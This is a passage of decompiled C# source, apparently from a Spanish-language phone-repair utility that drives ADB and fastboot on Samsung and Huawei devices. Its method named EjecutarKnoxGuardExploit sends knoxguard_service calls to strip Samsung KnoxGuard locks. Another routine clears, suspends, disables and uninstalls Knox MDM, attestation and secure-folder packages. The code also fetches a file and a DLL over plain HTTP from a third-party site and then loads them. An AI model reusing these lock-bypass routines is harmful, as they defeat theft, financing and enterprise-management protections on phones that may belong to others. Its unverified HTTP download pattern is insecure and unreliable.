				this.txtOutput.AppendText("Paso 5: Enviando comandos KnoxGuard..." + Environment.NewLine);
				List<string> comandos = new List<string>
				{
					"service call knoxguard_service 40 s16 'null'",
					"service call knoxguard_service 38 s16 'null'",
					"service call knoxguard_service 41 s16",
					"service call knoxguard_service 40 s16 'null'",
					"ervice call knoxguard_service 38 s16 'null'",
					"ervice call knoxguard_service 41 s16",
					"shell devices",
					"quit"
				};
				try
				{
					foreach (string comando in comandos)
					{
						this.txtOutput.AppendText("→ Ejecutando: " + comando + Environment.NewLine);
						string salidaComando = this.EjecutarAdbConResultado(comando, selectedDevice);
						this.txtOutput.AppendText("Resultado: " + salidaComando + Environment.NewLine);
						await Task.Delay(200);
					}
				}
				finally
				{
					List<string>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				this.txtOutput.AppendText("✅ Proceso KnoxGuard finalizado. Si no hay reinicio, reinicia manualmente." + Environment.NewLine);
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText("❌ Error: " + ex.Message + Environment.NewLine);
			}
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x0000DA6C File Offset: 0x0000BC6C
		private void EjecutarAdb(string comando, string dispositivo)
		{
			Process process = new Process();
			process.StartInfo.FileName = "adb";
			process.StartInfo.Arguments = string.Format("-s {0} {1}", dispositivo, comando);
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x0000DAE0 File Offset: 0x0000BCE0
		private string EjecutarAdbConResultado(string comando, string dispositivo)
		{
			Process process = new Process();
			process.StartInfo.FileName = "adb";
			process.StartInfo.Arguments = string.Format("-s {0} {1}", dispositivo, comando);
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			string text = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return text.Trim();
		}

		// Token: 0x060000EA RID: 234 RVA: 0x0000DB68 File Offset: 0x0000BD68
		private async void btnkglocktoactive_Click(object sender, EventArgs e)
		{
			this.txtOutput.Clear();
			List<string> connectedDevices = this.GetAdbDevices();
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				bool flag2 = this.cmbDevicesAdb.SelectedItem == null;
				if (flag2)
				{
					MessageBox.Show("Selecciona un dispositivo ADB de la lista.");
				}
				else
				{
					string selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					this.processRunning = true;
					this.cancelRequested = false;
					this.SetAllButtonsEnabled(false, null);
					this.btnCancelarProceso.Enabled = true;
					this.VerificarEntornoSeguro();
					this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.InitializeProgressBar(2);
						this.UpdateProgressBar();
					}));
					string dllPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "sm");
					bool flag3 = !File.Exists(dllPath);
					if (flag3)
					{
						try
						{
							WebClient cliente = new WebClient();
							string urlDescarga = "http://reparacionesdecelular.com/up/filesfix/sm";
							cliente.DownloadFile(urlDescarga, dllPath);
							MessageBox.Show("✅ Se descargó Files necesarios correctamente. Por favor, reinicia la aplicación.");
							return;
						}
						catch (Exception ex3)
						{
							Exception ex = ex3;
							MessageBox.Show("❌ No se pudo descargar Auth:" + ex.Message);
							return;
						}
						finally
						{
							this.processRunning = false;
							this.AplicarPermisosDesdeFirebasePorPlan();
							this.btnCancelarProceso.Enabled = false;
						}
					}
					bool flag4 = !connectedDevices.Contains(selectedDevice);
					if (flag4)
					{
						MessageBox.Show("El dispositivo seleccionado no está conectado.");
						try
						{
						}
						finally
						{
							this.processRunning = false;
							this.AplicarPermisosDesdeFirebasePorPlan();
							this.btnCancelarProceso.Enabled = false;
						}
					}
					else
					{
						await this.EjecutarKnoxGuardExploit(selectedDevice);
						try
						{
						}
						catch (Exception ex2)
						{
							MessageBox.Show("❌ Error: " + ex2.Message);
						}
						finally
						{
							this.processRunning = false;
							this.AplicarPermisosDesdeFirebasePorPlan();
							this.btnCancelarProceso.Enabled = false;
						}
						this.processRunning = false;
						this.btnCancelarProceso.Enabled = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
					}
				}
			}
		}

		// Token: 0x060000EB RID: 235 RVA: 0x0000DBB0 File Offset: 0x0000BDB0
		private void btnRebootDevice_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				Task.Run(delegate()
				{
					try
					{
						List<string> adbDevices = this.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
						if (flag2)
						{
							MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
							return;
						}
						string selectedDevice = "";
						this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
						}));
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						this.ExecuteAdbCommand("reboot", selectedDevice);
						this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.txtOutput.AppendText(Environment.NewLine + "✅ Reiniciando..." + Environment.NewLine);
						}));
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
					}
					catch (Exception ex)
					{
						MessageBox.Show("Error al reiniciar el dispositivo: " + ex.Message);
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				});
			}
		}

		// Token: 0x060000EC RID: 236 RVA: 0x0000DC14 File Offset: 0x0000BE14
		private void btnRebootDeviceBL_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				Task.Run(delegate()
				{
					try
					{
						List<string> adbDevices = this.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
						if (flag2)
						{
							MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
							return;
						}
						string selectedDevice = "";
						this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
						}));
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						this.ExecuteAdbCommand("reboot bootloader", selectedDevice);
						this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.txtOutput.AppendText(Environment.NewLine + "✅ Reiniciando..." + Environment.NewLine);
						}));
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
					}
					catch (Exception ex)
					{
						MessageBox.Show("Error al reiniciar el dispositivo: " + ex.Message);
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				});
			}
		}

		// Token: 0x060000ED RID: 237 RVA: 0x0000DC78 File Offset: 0x0000BE78
		private void btnRebootRecovery_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				Task.Run(delegate()
				{
					try
					{
						List<string> adbDevices = this.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
						if (flag2)
						{
							MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
							return;
						}
						string selectedDevice = "";
						this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
						}));
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						this.ExecuteAdbCommand("reboot recovery", selectedDevice);
						this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.txtOutput.AppendText(Environment.NewLine + "✅ Reiniciando en recovery..." + Environment.NewLine);
						}));
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
					}
					catch (Exception ex)
					{
						MessageBox.Show("Error al reiniciar en recovery: " + ex.Message);
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				});
			}
		}

		// Token: 0x060000EE RID: 238 RVA: 0x0000DCDC File Offset: 0x0000BEDC
		private string ExtraerHexDesdeLeftover(string salida)
		{
			Regex regex = new Regex("Leftover Capture Data:\\s*([0-9a-fA-F]+)");
			Match match = regex.Match(salida);
			bool success = match.Success;
			string result;
			if (success)
			{
				result = match.Groups[1].Value;
			}
			else
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x060000EF RID: 239 RVA: 0x0000DD28 File Offset: 0x0000BF28
		private string DecodeHexToAscii(string hex)
		{
			string result;
			try
			{
				byte[] bytes = (from i in Enumerable.Range(0, hex.Length / 2)
				select Convert.ToByte(hex.Substring(checked(i * 2), 2), 16)).ToArray<byte>();
				result = Encoding.ASCII.GetString(bytes);
			}
			catch (Exception ex)
			{
				result = "";
			}
			return result;
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x0000DDA4 File Offset: 0x0000BFA4
		private async void btnReadHuaweiInfo_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución.");
			}
			else
			{
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.InitializeProgressBar(2);
				this.UpdateProgressBar();
				this.txtOutput.Clear();
				this.txtOutput.AppendText("\ud83d\udd0d Leyendo información de Huawei/Honor..." + Environment.NewLine);
				try
				{
					Dictionary<string, string> info = await this.LeerInfoHuaweiFastbootAsync();
					if (info.ContainsKey("Error"))
					{
						this.txtOutput.AppendText("❌ " + info["Error"] + Environment.NewLine);
					}
					else
					{
						this.txtOutput.AppendText(string.Format("\ud83d\udd11 Serial Number: {0}{1}", info["Serial"], Environment.NewLine));
						this.txtOutput.AppendText(string.Format("\ud83d\udcf1 Modelo: {0}{1}", info["Modelo"], Environment.NewLine));
						this.txtOutput.AppendText(string.Format("\ud83d\udce6 Build Number: {0}{1}", info["Build"], Environment.NewLine));
						this.txtOutput.AppendText(string.Format("\ud83d\udcf1 Android Version: {0}{1}", info["AndroidVer"], Environment.NewLine));
						this.txtOutput.AppendText(string.Format("\ud83e\uddf1 Base Version: {0}{1}", info["BaseVer"], Environment.NewLine));
						this.txtOutput.AppendText(string.Format("\ud83d\udcc1 Preload Version: {0}{1}", info["PreloadVer"], Environment.NewLine));
					}
				}
				catch (Exception ex)
				{
					this.txtOutput.AppendText("❌ Error inesperado: " + ex.Message + Environment.NewLine);
				}
				finally
				{
					this.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.RestaurarUIHuawei();
					}));
				}
			}
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x0000DDEC File Offset: 0x0000BFEC
		private async Task<Dictionary<string, string>> LeerInfoHuaweiFastbootAsync()
		{
			Dictionary<string, string> info = new Dictionary<string, string>
			{
				{
					"Serial",
					"No detectado"
				},
				{
					"Modelo",
					"No detectado"
				},
				{
					"Build",
					"No detectado"
				},
				{
					"AndroidVer",
					"No detectado"
				},
				{
					"BaseVer",
					"No detectado"
				},
				{
					"PreloadVer",
					"No detectado"
				}
			};
			try
			{
				List<string> devices = await Task.Run<List<string>>(() => this.GetFastbootDevices());
				if (devices.Count == 0)
				{
					info["Error"] = "No hay dispositivos Huawei/Honor en modo Fastboot conectados.";
					return info;
				}
				Dictionary<string, string> dictionary = info;
				Form1 form = this;
				TaskAwaiter<string> taskAwaiter = Task.Run<string>(() => this.EjecutarFastboot("oem get-product-model")).GetAwaiter();
				TaskAwaiter<string> taskAwaiter2;
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter<string>);
				}
				Dictionary<string, string> dictionary2 = dictionary;
				string key = "Modelo";
				Form1 form2 = form;
				string result = taskAwaiter.GetResult();
				taskAwaiter = default(TaskAwaiter<string>);
				dictionary2[key] = form2.LimpiarHuaweiOutput(result);
				dictionary = null;
				form = null;
				dictionary = info;
				form = this;
				TaskAwaiter<string> taskAwaiter3 = Task.Run<string>(() => this.EjecutarFastboot("oem get-build-number")).GetAwaiter();
				if (!taskAwaiter3.IsCompleted)
				{
					await taskAwaiter3;
					taskAwaiter3 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter<string>);
				}
				Dictionary<string, string> dictionary3 = dictionary;
				string key2 = "Build";
				Form1 form3 = form;
				result = taskAwaiter3.GetResult();
				taskAwaiter3 = default(TaskAwaiter<string>);
				dictionary3[key2] = form3.LimpiarHuaweiOutput(result);
				dictionary = null;
				form = null;
				dictionary = info;
				form = this;
				TaskAwaiter<string> taskAwaiter4 = Task.Run<string>(() => this.EjecutarFastboot("oem oeminforead-ANDROID_VERSION")).GetAwaiter();
				if (!taskAwaiter4.IsCompleted)
				{
					await taskAwaiter4;
					taskAwaiter4 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter<string>);
				}
				Dictionary<string, string> dictionary4 = dictionary;
				string key3 = "AndroidVer";
				Form1 form4 = form;
				result = taskAwaiter4.GetResult();
				taskAwaiter4 = default(TaskAwaiter<string>);
				dictionary4[key3] = form4.LimpiarHuaweiOutput(result);
				dictionary = null;
				form = null;
				dictionary = info;
				form = this;
				TaskAwaiter<string> taskAwaiter5 = Task.Run<string>(() => this.EjecutarFastboot("oem oeminforead-BASE_VERSION")).GetAwaiter();
				if (!taskAwaiter5.IsCompleted)
				{
					await taskAwaiter5;
					taskAwaiter5 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter<string>);
				}
				Dictionary<string, string> dictionary5 = dictionary;
				string key4 = "BaseVer";
				Form1 form5 = form;
				result = taskAwaiter5.GetResult();
				taskAwaiter5 = default(TaskAwaiter<string>);
				dictionary5[key4] = form5.LimpiarHuaweiOutput(result);
				dictionary = null;
				form = null;
				dictionary = info;
				form = this;
				TaskAwaiter<string> taskAwaiter6 = Task.Run<string>(() => this.EjecutarFastboot("oem oeminforead-PRELOAD_VERSION")).GetAwaiter();
				if (!taskAwaiter6.IsCompleted)
				{
					await taskAwaiter6;
					taskAwaiter6 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter<string>);
				}
				Dictionary<string, string> dictionary6 = dictionary;
				string key5 = "PreloadVer";
				Form1 form6 = form;
				result = taskAwaiter6.GetResult();
				taskAwaiter6 = default(TaskAwaiter<string>);
				dictionary6[key5] = form6.LimpiarHuaweiOutput(result);
				dictionary = null;
				form = null;
				string serialRaw = await Task.Run<string>(() => this.EjecutarFastboot("devices"));
				info["Serial"] = this.LimpiarSerialHuawei(serialRaw);
			}
			catch (Exception ex)
			{
				info["Error"] = ex.Message;
			}
			return info;
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x0000DE30 File Offset: 0x0000C030
		private string LimpiarHuaweiOutput(string output)
		{
			foreach (string text in output.Split(new string[]
			{
				Environment.NewLine,
				"\n",
				"\r\n"
			}, StringSplitOptions.RemoveEmptyEntries))
			{
				bool flag = text.Contains("(bootloader)");
				if (flag)
				{
					string text2 = text.Replace("(bootloader)", "").Trim();
					bool flag2 = !string.IsNullOrEmpty(text2);
					if (flag2)
					{
						return text2;
					}
				}
			}
			return "No detectado";
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x0000DEC8 File Offset: 0x0000C0C8
		private string LimpiarSerialHuawei(string output)
		{
			foreach (string text in output.Split(new string[]
			{
				Environment.NewLine,
				"\n",
				"\r\n"
			}, StringSplitOptions.RemoveEmptyEntries))
			{
				bool flag = text.ToLower().Contains("fastboot");
				if (flag)
				{
					return text.Split(new char[]
					{
						'\t'
					})[0].Trim();
				}
			}
			return "No detectado";
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x0000DF50 File Offset: 0x0000C150
		private void RestaurarUIHuawei()
		{
			this.processRunning = false;
			this.btnCancelarProceso.Enabled = false;
			this.AplicarPermisosDesdeFirebasePorPlan();
			this.btnReadHuaweiInfo.Enabled = true;
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x0000DF7C File Offset: 0x0000C17C
		private void btnKnoxNew_Click(object sender, EventArgs e)
		{
			try
			{
				List<string> adbDevices = this.GetAdbDevices();
				bool flag = adbDevices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
				if (flag)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else
				{
					string selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					Dictionary<string, string> dictionary = new Dictionary<string, string>
					{
						{
							"Knox 1",
							"com.sec.enterprise.knox.cloudmdm.smdms"
						},
						{
							"Knox 2",
							"com.samsung.android.knox.containercore"
						},
						{
							"Knox 3",
							"com.samsung.android.knox.app.networkfilter"
						},
						{
							"Knox 4",
							"com.knox.vpn.proxyhandler"
						},
						{
							"Knox 5",
							"com.samsung.android.knox.kpecore"
						},
						{
							"Knox 6",
							"com.samsung.android.knox.zt.framework"
						},
						{
							"Knox 7",
							"com.samsung.android.knox.attestation"
						},
						{
							"Knox 8",
							"com.samsung.knox.securefolder"
						}
					};
					this.MostrarEstadoAntesDelProceso("MDM NEW ATT", dictionary, selectedDevice);
					List<string> list = new List<string>();
					List<string> list2 = new List<string>();
					List<string> list3 = new List<string>();
					List<string> list4 = new List<string>();
					List<string> list5 = new List<string>();
					List<string> list6 = new List<string>();
					List<string> list7 = new List<string>();
					try
					{
						foreach (string arg in dictionary.Values)
						{
							list.Add(string.Format("shell pm clear --user 0 {0}", arg));
							list2.Add(string.Format("shell am crash {0}", arg));
							list3.Add(string.Format("shell pm suspend {0}", arg));
							list4.Add(string.Format("shell am kill {0}", arg));
							list5.Add(string.Format("shell am set-inactive {0}", arg));
							list6.Add(string.Format("shell pm disable-user --user 0 {0}", arg));
							list7.Add(string.Format("shell pm uninstall --user 0 {0}", arg));
						}
					}
					finally
					{
						Dictionary<string, string>.ValueCollection.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					List<List<string>> etapas = new List<List<string>>
					{
						list,
						list2,
						list3,
						list4,
						list5,
						list6,
						list7
					};
					this.EjecutarProcesoAdb("Knox New", etapas, selectedDevice);
					this.MostrarEstadoDespuesDelProceso("Knox New", dictionary, selectedDevice);
					this.txtOutput.AppendText("En caso de no funcionar, intentar con MÉTODO NEW." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("Error durante el proceso: {0}", ex.Message));
			}
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x0000E244 File Offset: 0x0000C444
		public void ConsultarFirmwaresSamsungDesdeOutput(RichTextBox txtOutput)
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "HtmlAgilityPack.dll");
			bool flag = !File.Exists(text);
			if (flag)
			{
				try
				{
					WebClient webClient = new WebClient();
					string address = "http://reparacionesdecelular.com/up/filesfix/HtmlAgilityPack.dll";
					webClient.DownloadFile(address, text);
					MessageBox.Show("✅ Se descargó HtmlAgilityPack.dll correctamente. Por favor, reinicia la aplicación.");
					return;
				}
				catch (Exception ex)
				{
					MessageBox.Show("❌ No se pudo descargar HtmlAgilityPack.dll: " + ex.Message);
					return;
				}
			}
			try
			{
				Form1._Closure$__209-0 CS$<>8__locals1 = new Form1._Closure$__209-0(CS$<>8__locals1);
				string texto = this.LimpiarTexto(txtOutput.Text);
				string text2 = this.ExtraerValorDesdeTexto(texto, "model:");
				bool flag2 = string.IsNullOrEmpty(text2);
				if (flag2)
				{
					MessageBox.Show("Información NO detectada en el log.");
					txtOutput.Clear();
				}
				else
				{
					string bl = this.ExtraerValorDesdeTexto(texto, "BL :");
					CS$<>8__locals1.$VB$Local_bitActual = this.ObtenerBitDesdeCadenaBL(bl);
					int num = 0;
					int.TryParse(CS$<>8__locals1.$VB$Local_bitActual, out num);
					List<Dictionary<string, string>> list = this.ObtenerFirmwaresSamsung(text2.ToUpper());
					bool flag3 = list.Count == 0;
					if (flag3)
					{
						txtOutput.AppendText("No se encontró información de firmware. Conecte correctamente en Dowload o COM");
					}
					else
					{
						List<Dictionary<string, string>> list2 = list.Where(delegate(Dictionary<string, string> f)
						{
							bool flag7 = Regex.IsMatch(f["Patch"], "\\d{4}-\\d{2}-\\d{2}");
							return Operators.CompareString(f["BIT"], CS$<>8__locals1.$VB$Local_bitActual, false) == 0 && flag7;
						}).ToList<Dictionary<string, string>>();
						string arg = (list2.Count > 0) ? list2.Min((Form1._Closure$__.$I209-1 == null) ? (Form1._Closure$__.$I209-1 = ((Dictionary<string, string> f) => DateTime.Parse(f["Patch"]))) : Form1._Closure$__.$I209-1).ToString("yyyy-MM-dd") : "Desconocido";
						string arg2 = "Desconocido";
						CS$<>8__locals1.$VB$Local_blActual = this.ExtraerValorDesdeTexto(texto, "BL :").Trim().ToUpperInvariant();
						bool flag4 = !string.IsNullOrEmpty(CS$<>8__locals1.$VB$Local_blActual);
						if (flag4)
						{
							Dictionary<string, string> dictionary = list.FirstOrDefault((Dictionary<string, string> f) => Operators.CompareString(f["Version"].ToUpperInvariant(), CS$<>8__locals1.$VB$Local_blActual, false) == 0);
							bool flag5 = dictionary != null && Regex.IsMatch(dictionary["Patch"], "\\d{4}-\\d{2}-\\d{2}");
							if (flag5)
							{
								arg2 = dictionary["Patch"];
							}
						}
						txtOutput.AppendText(string.Format("Este dispositivo es Bit {0}  parche de seguridad {1}.{2}", CS$<>8__locals1.$VB$Local_bitActual, arg2, Environment.NewLine));
						txtOutput.AppendText(string.Format("El parche más bajo de seguridad de su mismo Bit es {0}.{1}", arg, Environment.NewLine));
						txtOutput.AppendText("\ud83d\udccb Lista de CSC, VERSION, BIT, parches y OS encontrados (solo Bit >= actual):" + Environment.NewLine);
						try
						{
							foreach (Dictionary<string, string> dictionary2 in list)
							{
								int num2 = 0;
								bool flag6 = int.TryParse(dictionary2["BIT"], out num2) && num2 >= num;
								if (flag6)
								{
									string text3 = (num2 > num) ? " ⚠️" : "";
									txtOutput.AppendText(string.Format("CSC: {0} | V.: {1} | BIT: {2} | Patch: {3} | OS: {4}{5}", new object[]
									{
										dictionary2["CSC"],
										dictionary2["Version"],
										dictionary2["BIT"],
										dictionary2["Patch"],
										dictionary2["OS"],
										text3
									}) + Environment.NewLine);
								}
							}
						}
						finally
						{
							List<Dictionary<string, string>>.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
					}
				}
			}
			catch (Exception ex2)
			{
				MessageBox.Show("⚠️ Error al consultar firmwares: " + ex2.Message);
			}
			finally
			{
				this.processRunning = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
				this.btnCancelarProceso.Enabled = false;
			}
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x0000E648 File Offset: 0x0000C848
		private void btnConsultarFirmwaresSamsung_Click(object sender, EventArgs e)
		{
			this.ConsultarFirmwaresSamsungDesdeOutput(this.txtOutput);
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x0000E658 File Offset: 0x0000C858
		private List<Dictionary<string, string>> ObtenerFirmwaresSamsung(string model)
		{
			List<Dictionary<string, string>> list = new List<Dictionary<string, string>>();
			string url = string.Format("https://samfw.com/firmware/{0}/", model);
			try
			{
				HtmlWeb htmlWeb = new HtmlWeb();
				HtmlAgilityPack.HtmlDocument htmlDocument = htmlWeb.Load(url);
				HtmlNodeCollection htmlNodeCollection = htmlDocument.DocumentNode.SelectNodes("//table[contains(@class, 'table')]/tbody/tr");
				bool flag = htmlNodeCollection == null;
				if (flag)
				{
					return list;
				}
				try
				{
					foreach (HtmlNode htmlNode in ((IEnumerable<HtmlNode>)htmlNodeCollection))
					{
						HtmlNodeCollection htmlNodeCollection2 = htmlNode.SelectNodes("td");
						bool flag2 = htmlNodeCollection2 != null && htmlNodeCollection2.Count >= 6;
						if (flag2)
						{
							string text = htmlNodeCollection2[2].InnerText.Trim();
							string value = "";
							bool flag3 = text.Length >= 5;
							if (flag3)
							{
								value = text.Substring(checked(text.Length - 5), 1);
							}
							list.Add(new Dictionary<string, string>
							{
								{
									"CSC",
									htmlNodeCollection2[1].InnerText.Trim()
								},
								{
									"Version",
									text
								},
								{
									"BIT",
									value
								},
								{
									"Patch",
									this.LimpiarTextoPatch(htmlNodeCollection2[4].InnerText)
								},
								{
									"OS",
									this.LimpiarTextoOS(htmlNodeCollection2[5].InnerText)
								}
							});
						}
					}
				}
				finally
				{
					IEnumerator<HtmlNode> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al consultar Samfw: " + ex.Message);
			}
			return list;
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x0000E83C File Offset: 0x0000CA3C
		private string LimpiarTextoPatch(string texto)
		{
			texto = HttpUtility.HtmlDecode(texto);
			texto = texto.Replace("\r", "").Replace("\n", "").Replace("\t", "");
			texto = texto.Trim();
			Match match = Regex.Match(texto, "\\d{4}-\\d{2}-\\d{2}");
			bool success = match.Success;
			string result;
			if (success)
			{
				result = match.Value;
			}
			else
			{
				result = texto;
			}
			return result;
		}

		// Token: 0x060000FA RID: 250 RVA: 0x0000E8B0 File Offset: 0x0000CAB0
		private string LimpiarTextoOS(string texto)
		{
			texto = HttpUtility.HtmlDecode(texto);
			texto = texto.Replace("\r", "").Replace("\n", "").Replace("\t", "");
			return texto.Trim();
		}

		// Token: 0x060000FB RID: 251 RVA: 0x0000E900 File Offset: 0x0000CB00
		private string LimpiarTexto(string texto)
		{
			return texto.Replace("\r\n", Environment.NewLine).Replace("\r", Environment.NewLine).Replace("\n", Environment.NewLine);
		}

		// Token: 0x060000FC RID: 252 RVA: 0x0000E940 File Offset: 0x0000CB40
		private void btnAbrirFirmwareSamsung_Click(object sender, EventArgs e)
		{
			this.AbrirUrlFirmwareSamsung();
			try
			{
			}
			catch (Exception ex)
			{
				MessageBox.Show("❌ Error: " + ex.Message);
			}
			finally
			{
				this.processRunning = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
				this.btnCancelarProceso.Enabled = false;
			}
		}

		// Token: 0x060000FD RID: 253 RVA: 0x0000E9BC File Offset: 0x0000CBBC
		private void AbrirUrlFirmwareSamsung()
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				string texto = this.LimpiarTexto(this.txtOutput.Text);
				string text = this.ExtraerValorDesdeTexto(texto, "model:");
				string text2 = this.ExtraerValorDesdeTexto(texto, "carrierid:");
				string text3 = this.ExtraerValorDesdeTexto(texto, "BL :");
				bool flag2 = string.IsNullOrEmpty(text) || string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(text3);
				if (flag2)
				{
					MessageBox.Show("❌ Asegurar de leer Información del dispositivo");
				}
				else
				{
					string text4 = "https://samfw.com/firmware";
					string text5 = string.Format("{0}/{1}/{2}/{3}", new object[]
					{
						text4,
						text.ToUpper(),
						text2.ToUpper(),
						text3.ToUpper()
					});
					bool flag3 = this.UrlExiste(text5);
					if (flag3)
					{
						this.txtOutput.AppendText("✅ Firmware Samsung encontrado. Abriendo..." + Environment.NewLine);
						Process.Start(new ProcessStartInfo
						{
							FileName = text5,
							UseShellExecute = true
						});
					}
					else
					{
						this.txtOutput.AppendText("❌ No se encontró el firmware en Samfw para este modelo/versión." + Environment.NewLine);
					}
					try
					{
					}
					catch (Exception ex)
					{
